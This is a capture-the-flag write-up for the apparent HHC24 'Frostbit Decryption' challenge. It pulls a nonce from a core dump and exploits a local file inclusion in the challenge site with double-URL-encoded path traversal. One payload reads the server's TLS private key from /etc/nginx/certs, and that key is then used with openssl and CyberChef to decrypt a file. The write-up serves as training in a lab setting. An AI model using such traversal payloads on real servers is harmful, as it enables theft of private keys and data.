+++ 
draft = false
date = 2025-01-26T14:59:25+01:00
title = "HHC24 - Frostbit Decryption"
description = "Analyze of ransomware, looking for decryption key to restore of encrypted file"
slug = ""
authors = []
tags = [
    "HHC24",
    "Sans",
    "CTF",
]
categories = [
    "Ransomware",
    "Decryption",
    "DFIR",
    "Web-app Hacking",
    "Python",
    "RSA"
]
externalLink = ""
series = [
    "HHC24",
]
+++

## Introduction

>Hardest challenge of HHC24! This was challenge require series of multiple detective and attack techniques. Lot's of folks loose thier sanity during this road 🛣.

- There is no Silver 🥈 or Gold 🥇 variant. You will receive a silver medal when finishing the challange and gold when you solve Deativation challange.

## Decrypt PCAP

- Look for session key log file in dump:

```bash
strings frostbit_core_dump.13 | grep "secret" -i
```

- Other way to obtain the nonce can be:

```bash
strings frostbit_core_dump.13 | grep "session" -i
```

<https://api.frostbit.app/api/v1/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/session#>

- Our nonce is:

```json
{
    "nonce": "e6b27a8c416c8f03"
}
```

## Web Exploit

- working URL:

<https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=a08500d12558c120ca00081224024840>

- URL with enabled debug:

<https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=a08500d12558c120ca00081224024840&debug=true>

- Error page after modifing URI:
<https://api.frostbit.app/view/l7ng0p2uGRJO7rU/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=83270120-3b1c-41f3-b25b-deaa5b5d1327&debug=true>

```html
"Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Non-hexadecimal digit found\n"
```

- LFI indicating error:

 ```json
 {
    "debug": true,
    "error": "Status Id File Not Found"
}
```

- **Legend to LFI errors:**

```text
"invalid digest" = You have the right file path and file-name but you need to add padding character
"file not found" = You have the wrong file name or file path
```

- I experimented with the web application to discover a possibility to get LFI vulnerability. I used a know file and it's location to abuse the proxy rewrite, so I double enoded the path to the known file:
  - known file: `frostbit.png`
  - known file location: `/static/frostbit.png`
  - desired path: for python backend: `../static/frostbit.png`
  - double URL encoded path: `..%252Fstatic%252Ffrostbit.png` <- to Abuse the Proxy URL decode
  - Payload: <https://api.frostbit.app/view/..%252Fstatic%252Ffrostbit.png/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=e6b27a8c416c8f03e6b27a8c416c8f03e6b27a&debug=true>
  - Error:

```json
{
    "debug": true,
    "error": "Invalid Status Id or Digest"
}
```

- Template for payload:
<https://api.frostbit.app/view/{padding}{nonce}{nonce}/../{filepath}/{UUID}/status?digest=00000000000000000000000000000000&debug=true>

- **Note:** the ```/``` bewteen ```{nonce}/../{filepath}``` need to be URL encoded as well!

- **Working payload:**
<https://api.frostbit.app/view/aaaa%25e6%25b2%257a%258c%2541%256c%258f%2503%25e6%25b2%257a%258c%2541%256c%258f%2503%252F..%252F..%252Fstatic%252Ffrostbit.png/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=00000000000000000000000000000000&debug=true>

- Payload for `.key` file:

<https://api.frostbit.app/view/%25e6%25b2%257a%258c%2541%256c%258f%2503%25e6%25b2%257a%258c%2541%256c%258f%2503%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/83270120-3b1c-41f3-b25b-deaa5b5d1327/status?digest=00000000000000000000000000000000&debug=true>

### Decypher naughty list

- Decryption the `encryptedkey` from memory dump with collected .pem file:

 1. First convert the string (from memorry dump) into binary data using `xxd`:

    ```bash
        echo -n "8303aa5aaf930e50c46bc90a8b1fafd75f13424544cf3b64fe607fe5c56587c4a4576bdf07dd13efef23a17383500a7d73dc62a5e65a5c78612b42cfd5e002731c6b6d38a3c50ffc1675aa20474c688fa41238f3720be5f198f7f8ee8a31463f7baaee344e6d70446ec17385b842b4a55c6c8b60fb8d81904927fd8741476591675602f3019aa47079c124f2ce11c43f6aa2800f99b0c716868caf185e762d0819024f75b61f6930ede582929ac34eb5d9b3ba860ff40521c8189772ee0be4dd5e9af43b99aef62cf7bcfce8f59b8850d9f9494ac05a97159ecbee585a4f40e532bc22be448921d83bd22a0f7bf1dccec632d4cc6c332346bf4ed06b00a71ca84bab99fe9eab9e866246ff7634d70da21092e351135c26246859998c5f044c2802a93f3a627532ba783fd0dd3455ff570b703852f367925db4bae73feeea25279f4f31bf31d549c00c00514919aa871746c8be0976d8b700b912fb1148ec34d08efae008ac423383e86b68750297bf1e2bec81cf81b35fdb992be27295faa0a58ca70985a4155280ef0e4c63efb8285fb4b8ef02a5eb439f42cbfa0546df780e4654207839cb7d36ac5ef821b750284150f4a96fe3d6399f4b4a62ad07dacf06a5b94cf6a7220b03815a74f7a6160b413c6508dd731f8cc28748b7709315fcb2f6d101cb5ecf7ddc7c3b2033148f08ea69cdd7da0ef9567ad39e0d7613c40f00" | xxd -r -p > encryptedkey.bin
    ```

 2. Decrypt the generated `.bin` file with key `.pem` obtained from the web application:

    ```bash
    openssl pkeyutl -decrypt -inkey rsakey.pem -in encryptedkey.bin -out decryptedkey.key
    ```

 3. decryption key is:
 ```53bf2366675de4b10d60fe6c02c24f98,e6b27a8c416c8f03```

- Now, we can decrypt the `.csv`, I used  CyberChef with following recipe:
  - RSA -> key UTF8, IV UTF8, Mode CBC, INPUT/Output RAW:
 <https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'53bf2366675de4b10d60fe6c02c24f98'%7D,%7B'option':'UTF8','string':'e6b27a8c416c8f03'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)>

- File is not decrypted and we can look for child' name.

---

- Answer for this challange is: **Xena Xtreme** 🥈
